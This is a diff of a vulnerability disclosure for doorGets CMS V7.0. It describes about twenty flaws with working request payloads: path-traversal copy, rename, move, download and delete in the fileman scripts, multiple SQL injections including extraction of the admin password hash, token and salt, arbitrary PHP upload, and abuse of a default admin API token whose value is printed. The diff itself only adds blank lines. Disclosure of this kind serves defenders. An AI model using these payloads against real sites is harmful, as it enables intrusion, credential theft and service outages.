@@ -55,6 +55,7 @@ _ _ _
 **[1]**
 
 In \fileman\php\copyfile.php, there is no permission verification operation for the user.
+
 ![1.png](./img/1.png)
 
 Line 37 gets the source file to be copied.
@@ -85,16 +86,20 @@ f=%2Ffileman%2FUploads%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftong%2Fphpstudy%2FPH
 ![2.png](./img/2.png)
 
 Through the exploit, visit ```http://domain.com/fileman/httpd.conf``` and successfully get the content:
+
 ![3.png](./img/3.png)
 
 
 **[2]**
 
 In \fileman\php\copydir.php, there is no permission verification operation for the user.
+
 ![4.png](./img/4.png)
+
 ![5.png](./img/5.png)
 
 Line 52 calls the copyDir function:
+
 ![6.png](./img/6.png)
 
 Line 37 creates a new directory, line 44 copies the files in the source directory to the new directory, and does not filter the values of $newPath and $path, resulting in a file copy across directories.
@@ -128,6 +133,7 @@ Through the exploit, successfully copy the directory conf of the apache configur
 **[3]**
 
 In \fileman\php\renamefile.php, there is no permission verification operation for the user.
+
 ![9.png](./img/9.png)
 
 Line 34 determines whether the newly named file meets the criteria (forbidding renaming the file to. PHP file), and fails to filter the value of $path, resulting in file renaming across directories.
@@ -153,18 +159,22 @@ Cookie: PHPSESSID=; roxyld=%2Ffileman%2FUploads; roxyview=list
 
 f=%2Ffileman%2FUploads%2F..%2F..%2Fconfig%2Fconfig.php&n=..%2Ffileman%2FUploads%2Ftest.html
 ```
+
 ![10.png](./img/10.png)
 
 Successfully change /config/config.php to /fileman/Uploads/test.html and go to ```http://domain.com/fileman/Uploads/test.html``` to get the content:
+
 ![11.png](./img/11.png)
 
 At the same time, the website cannot provide services because of the lack of configuration files:
+
 ![12.png](./img/12.png)
 
 
 **[4]**
 
 In \fileman\php\movefile.php, there is no permission verification operation for the user.
+
 ![13.png](./img/13.png)
 
 Line 36 limits the name of the new file.
@@ -195,9 +205,11 @@ f=%2Ffileman%2FUploads%2F..%2F..%2Fconfig%2Fconfig.php&n=%2Ffileman%2FUploads%2F
 ![14.png](./img/14.png)
 
 Successfully change /config/config.php to /fileman/Uploads/test1.html and get the contents of the file by visiting http://domain.com/fileman/Uploads/test1.html:
+
 ![15.png](./img/15.png)
 
 At the same time, the website cannot provide services because of the lack of configuration files:
+
 ![16.png](./img/16.png)
 
 
@@ -205,46 +217,56 @@ At the same time, the website cannot provide services because of the lack of con
 **[5]**
 
 In \fileman\php\downloaddir.php, there is no permission verification operation for the user.
+
 ![17.png](./img/17.png)
 
 Line 41 calls the RoxyFile::ZipDir function:
+
 ![18.png](./img/18.png)
 
 Line 167 calls the ZipAddDir function to get the $path specified directory file compressed into a .zip file, but does not filter the value of $path.
 
 You can download the file under /config/ by requesting the following:```
 http://domain.com/fileman/php/downloaddir.php?d=/fileman/Uploads/../../config```
+
 ![19.png](./img/19.png)
 
 Successfully obtained the file under /config/:
+
 ![20.png](./img/20.png)
 
 
 **[6]**
 
 In \fileman\php\download.php, there is no permission verification operation for the user.
+
 ![21.png](./img/21.png)
 
 Line 36 gets the $path specified file, but does not filter the $path value.
 
 You can download the /config/config.php file by requesting:```
 http://domain.com/fileman/php/download.php?f=/fileman/Uploads/../../config/config.php```
+
 ![22.png](./img/22.png)
 
 Successfully obtained the contents of /config/config.php:
+
 ![23.png](./img/23.png)
 
 
 **[7]**
 
 In \fileman\php\deletefile.php, there is no permission verification operation for the user.
+
 ![24.png](./img/24.png)
 
 Line 29 gets the value of $path.
 Line 30 calls the verifyPath function and passes the $path in the function:
+
 ![25.png](./img/25.png)
 
 Line 74 calls the checkPath function:
+
 ![26.png](./img/26.png)
 
 The value obtained by getFilesPath() is "/fileman/Uploads".
@@ -272,23 +294,28 @@ Cookie: PHPSESSID=; roxyld=%2Ffileman%2FUploads; roxyview=list
 f=%2Ffileman%2FUploads%2F../admin.json
 ```
 Successfully deleted files by exploiting the vulnerability:
+
 ![27.png](./img/27.png)
 
 
 **[8]**
 
 In the getResponse function of \doorgets\app\views\ajax\contactView.php:
+
 ![28.png](./img/28.png)
 
 Line 142 when $errors is empty and the POST data is not empty, line 156 calls the dbQI function and passes the $data. In this function:
+
 ![29.png](./img/29.png)
 
 Line 165 calls the dbVQI function to splice the value of $data into a database query statement and assign it to $q.
+
 ![30.png](./img/30.png)
 
 Line 167 passes $q into the query function to perform a database query directly.
 
 The value obtained by the Params function will be processed as follows, '”< will be materialized, but \ will not be processed.
+
 ![31.png](./img/31.png)
 
 Since we can control multiple parameters in the SQL statement, let the first parameter take \, the value will comment out the " after the statement, so that the second parameter can be injected.
@@ -316,12 +343,14 @@ The last SQL statement executed by this program is:
 INSERT INTO `_dg_inbox` (`uri_module`,`lu`,`email`,`nom`,`sujet`,`message`,`telephone`,`date_creation`) VALUES ("contact","2","todaro@localhost.com","4\",",(select/**/1=(updatexml(1,concat(0x5e24,(select@@version),0x5e24),1))),6,18010101010,1551774101)#","4444","5555555555","1551777905");
 ```
 The current database version obtained by SQL injection is 5.5.53:
+
 ![32.png](./img/32.png)
 
 
 **[9]**
 
 In the getResponse function of \doorgets\app\views\ajax\commentView.php:
+
 ![33.png](./img/33.png)
 
 Line 166 defines the value of $data.
@@ -333,6 +362,7 @@ Line 184, $data ['nom'] will get the user's "First name" value directly when the
 ![34.png](./img/34.png)
 
 Line 192 calls the dbQI function and passes the parameter $data, and then calls the dbVQI function in the dbQI function to splice the $data data into SQL statements:
+
 ![35.png](./img/35.png)
 
 Since the system does not do database anti-injection well, in the case that multiple parameters are controllable, the following parameters can be escaped by inserting \, which eventually leads to sql injection.
@@ -342,6 +372,7 @@ After logging in, visit ```http://domain.com/dg-user/?controller=account``` and 
 ,(select concat((select password from _users where id=7),(select token from _users where id=7),(select hex(salt) from _users where id=7))))#```
 
 Then post a comment on the homepage of the website with the following comments:
+
 ![36.png](./img/36.png)
 
 The SQL statement executed by the program is:
@@ -351,6 +382,7 @@ INSERT INTO `_dg_comments` (`uri_module`,`uri_content`,`stars`,`url`,`date_creat
 Then, the "password", "token", and "salt" values of the administrator obtained by the injection are displayed at the "First name" of the homepage comment content.
 ```select concat((select password from _users where id=7),(select token from _users where id=7),(select hex(salt) from _users where id=7))```
 The injection results are as follows:
+
 ![37.png](./img/37.png)
 
 The administrator's "password" is:```
@@ -360,12 +392,14 @@ The administrator's "token" is:```
 The administrator's "hex(salt)" is:```
 3C474D333F552A2D405E412A646642634F3C5B7D584B5B622A394821622F38313636655D50396B514031```
 The data obtained by injection is consistent with the direct query in the database:
+
 ![38.png](./img/38.png)
 
 
 **[10]**
 
 In \fileman\php\upload.php, there is no permission verification operation for the user.
+
 ![39.png](./img/39.png)
 
 Line 33 calls the verifyPath function to verify $path. The value of $_POST['d'] is required to contain "/fileman/Uploads". Due to the lack of filtering treatment, there is a problem of uploading files across directories.
@@ -374,19 +408,23 @@ Line 33 calls the verifyPath function to verify $path. The value of $_POST['d'] 
 
 Line 41 gets the name of the uploaded file.
 Line 45 calls the RoxyFile:: CanUploadFile function:
+
 ![41.png](./img/41.png)
 
 Line 140 will determine whether the file is allowed to upload. The content of FORBIDDEN_UPLOADS is from \doorGets_CMS_V7.0\fileman\conf.json, as follows:
+
 ![42.png](./img/42.png)
 
 FORBIDDEN_UPLOADS restricts .php file uploads, without restricting the upload of .json files, and limits the ability to overwrite existing files.
 
 Try to delete the \doorGets_CMS_V7.0\fileman\conf.json file and leave the contents of FORBIDDEN_UPLOADS empty. This will enable the upload of .php files, but it will not work. The reasons are as follows:
+
 ![43.png](./img/43.png)
 
 If the \doorGets_CMS_V7.0\fileman\conf.json file does not exist or is empty, it will exit directly.
 
 The following is found in the \fileman\index.php file:
+
 ![44.png](./img/44.png)
 
 Lines 12-14 get the information of the currently logged in user. Line 16 determines the type of the user. By default, all logged in users' $user['fileman'] are 'admin', and the program will copy \doorGets_CMS_V7.0\fileman\admin.json to \doorGets_CMS_V7.0\fileman\conf.json.
@@ -492,15 +530,19 @@ Content-Type: image/jpeg
 ------WebKitFormBoundaryyvbOyiQFuiy0akbE--
 ```
 (Note that "FORBIDDEN_UPLOADS" does not contain php)
+
 ![46.png](./img/46.png)
 
 Log in to the user account and go to ```http://domain.com/fileman/index.php```. You will find that "FORBIDDEN_UPLOADS" of /fileman/conf.json does not contain “php”:
+
 ![47.png](./img/47.png)
 
 Finally upload the .php file with the following request:
+
 ![48.png](./img/48.png)
 
 Visit ```http://domain.com/fileman/test.php``` and find that the .php file was uploaded successfully:
+
 ![49.png](./img/49.png)
 
 
@@ -511,7 +553,9 @@ After the doorGets CMS is built, the administrator account password is deseriali
 Request the following address:```
 http://domain.com/setup/temp/admin.php
 http://domain.com/setup/temp/database.php```
+
 ![50.png](./img/50.png)
+
 ![51.png](./img/51.png)
 
 
@@ -540,6 +584,7 @@ If the administrator visits the following page, "Google Analytics code" will be 
 **[13]**
 
 After the doorGets cms is created, the database table _users_access_token has several records by default:
+
 ![52.png](./img/52.png)
 
 You can also get this value by downloading /setup/data/database.zip.
@@ -548,9 +593,11 @@ The administrator's id is 7, and his token is:```
 H0XZlT44FcN1j9LTdFc5XRXhlF30UaGe1g3cZY6i1K9```
 
 In the \doorgets\core\api\doorGetsApi.php:
+
 ![53.png](./img/53.png)
 
 On line 72, call the isValidAccessToken function to get the current user, in this function:
+
 ![54.png](./img/54.png)
 
 Line 349 obtains the access_token value through the POST request, and line 359 obtains the user data by querying the token value of the table _users_access_token.
@@ -560,12 +607,15 @@ Since the access_token we submitted is the administrator's access_token, the obt
 Then we can create a blog post with administrator privileges.
 
 In the \doorgets\app\requests\api\blogRequest.php:
+
 ![55.png](./img/55.png)
 
 Line 52 gets the current user as an administrator.
+
 ![56.png](./img/56.png)
 
 Line 131 when the request is a POST request, the parameter is passed as required by line 141.
+
 ![57.png](./img/57.png)
 
 Line 197 writes the blog's data to the database.
@@ -656,6 +706,7 @@ Sauvegarder
 ```
 You can create an article with the title "bbb5" and the content "news_test_by_guest3" with administrator privileges:```
 http://domain.com/?blog=news-test-by-guest2-en```
+
 ![58.png](./img/58.png)
 
 Similarly, file operations under \doorgets\app\requests\api\ can be operated with administrator privileges in this way.
@@ -664,6 +715,7 @@ Similarly, file operations under \doorgets\app\requests\api\ can be operated wit
 **[14]**
 
 In \doorgets\app\requests\user\configurationRequest.php:
+
 ![59.png](./img/59.png)
 
 Line 837 enters the case when $_GET['action']= analytics.
@@ -711,17 +763,20 @@ The SQL statement executed by the program is:
 
 Then visit ```http://domain.com/dg-user/?controller=configuration&action=analytics```
 You can see that the value of select user() obtained by injection is: root@localhost
+
 ![60.png](./img/60.png)
 
 **[15]**
 
 In \doorGets_CMS_V7.0\doorgets\app\requests\user\modulecategoryRequest.php:
+
 ![61.png](./img/61.png)
 
 Line 155 calls the dbQI function and passes the parameter $dataNext for database query. Because there is no filtering, SQL injection is caused.
 
 After the administrator logs in, visit ```http://domain.com/dg-user/?controller=modulecategory&uri=blog&lg=en```
 Click below:
+
 ![62.png](./img/62.png)
 
 After filling in the data, capture the packet, replace the obtained cookie and modulecategory_add_token with the following request, and then submit:
@@ -791,12 +846,14 @@ The SQL statement executed by the program is:
 ```INSERT INTO `_categories` (`uri_module`,`ordre`,`id_parent`,`date_creation`) VALUES ("blog","17","0","1555398477");INSERT INTO `_categories_traduction` (`langue`,`nom`,`titre`,`description`,`uri`,`meta_titre`,`meta_description`,`meta_keys`,`date_creation`,`id_cat`) VALUES ("en","test11\",",(select/**/1=(updatexml(1,concat(0x5e24,(select/**/user()),0x5e24),1))),2,0x626c6f672d74657374312d656e,22,222,1,1555397447,4)#","test3","blog-test1-en","test2","test3","","1555398477","17");```
 
 You can get the current database user through SQL injection:
+
 ![63.png](./img/63.png)
 
 
 **[16]**
 
 In \doorgets\app\requests\user\configurationRequest.php:
+
 ![64.png](./img/64.png)
 
 Line 800 enters the case when $_GET['action']= network.
@@ -850,12 +907,14 @@ You can see that the value of select user() obtained by injection is: root@local
 **[17]**
 
 In \doorgets\app\requests\user\modulecategoryRequest.php:
+
 ![66.png](./img/66.png)
 
 Line 222 calls the dbQU function and passes the $data for database query. Because there is no filtering, SQL injection is caused.
 
 After the administrator logs in, visit ```http://domain.com/dg-user/?controller=modulecategory&uri=blog&lg=en```
 Click below:
+
 ![67.png](./img/67.png)
 
 After filling in the data, capture the packet, replace the obtained cookie and modulecategory_edit_token with the following request, and then submit:
@@ -925,21 +984,26 @@ Save
 ```UPDATE `_categories_traduction` SET langue = 'en', nom = 'test1\', titre = ',description=(select/**/@@version)#', description = 'test3', uri = 'blog-test1-en', meta_titre = 'test2', meta_description = 'test3', meta_keys = '' WHERE id = '1'  LIMIT 1  ;```
 
 Re-visit ```http://domain.com/dg-user/?controller=modulecategory&uri=blog&lg=en``` and enter the one just modified, you can get the current database version by SQL injection:
+
 ![68.png](./img/68.png)
 
 
 **[18]**
 
 In \doorgets\app\requests\user\configurationRequest.php:
+
 ![69.png](./img/69.png)
 
 Line 283 determines if the token is valid.
+
 ![70.png](./img/70.png)
 
 Lines 285-290 get the value of $dDefault.
+
 ![71.png](./img/71.png)
 
 Line 318 passes $dDefault to call the dbQU function for database query:
+
 ![72.png](./img/72.png)
 
 Since we can control multiple parameters in the SQL statement, let the first parameter take \, the value will comment out the " after the statement, so that the second parameter can be injected.
@@ -1047,12 +1111,14 @@ The SQL statement executed by the program is:
 
 Revisit ```http://domain.com/dg-user/?controller=configuration&action=siteweb```
 The result of getting SQL injection is: root@localhost
+
 ![73.png](./img/73.png)
 
 
 **[19]**
 
 In \doorgets\app\requests\user\configurationRequest.php:
+
 ![74.png](./img/74.png)
 
 Line 1083 enters the case when $_GET['action']=setup and $_GET['do']=delete.
@@ -1063,9 +1129,11 @@ Since the value of file is not filtered, an attacker can delete any file.
 
 Administrators log in and access ```http://domain.com/dg-user/?Controller=configuration&action=setup```
 If there is no backup currently, then back up one:
+
 ![75.png](./img/75.png)
 
 Then select a backup, click the button below and grab the package:
+
 ![76.png](./img/76.png)
 
 Modify the value of the file parameter as follows:
@@ -1105,12 +1173,14 @@ After the request, you can delete /data/1234.txt(test file)
 **[20]**
 
 In \doorgets\app\requests\user\emailingRequest.php:
+
 ![77.png](./img/77.png)
 
 Line 119 directly inserts the key value in the post data into the database query, resulting in injection.
 
 After the administrator logs in, visit ```http://domain.com/dg-user/?controller=emailing```
 Click below:
+
 ![78.png](./img/78.png)
 
 After filling in the data, capture the packet, replace the obtained cookie and emerging_add_token with the following request, and then request:
@@ -1166,20 +1236,25 @@ The SQL statement executed by the program is:
 ```INSERT INTO `_dg_newsletter` (`id_user`,`nom`,`email`,`description`,`date_creation`)/**/VALUES(7,(select@@version),'test@localhost_com','aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa','1554791193');#`,`nom`,`email`,`description`,`date_creation`) VALUES ("7"," ","test1","test@localhost.com","aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","1554791868");```
 
 Re-request ```http://domain.com/dg-user/?controller=emailing```, you can get the current database version 5.5.53 through SQL injection:
+
 ![79.png](./img/79.png)
 
 
 **[21]**
 
 http://domain.com/doorgets/routers/ajaxRouter.php
+
 ![80.png](./img/80.png)
 
 http://domain.com/ajax/index.php?uri=1234%5c
+
 ![81.png](./img/81.png)
 
 http://domain.com/ajax/index.php?uri=home/&action=sendForm&controller=survey
+
 ![82.png](./img/82.png)
 
 view-source:domain.com/cache/template/index_header.tpl.php
+
 ![83.png](./img/83.png)
 
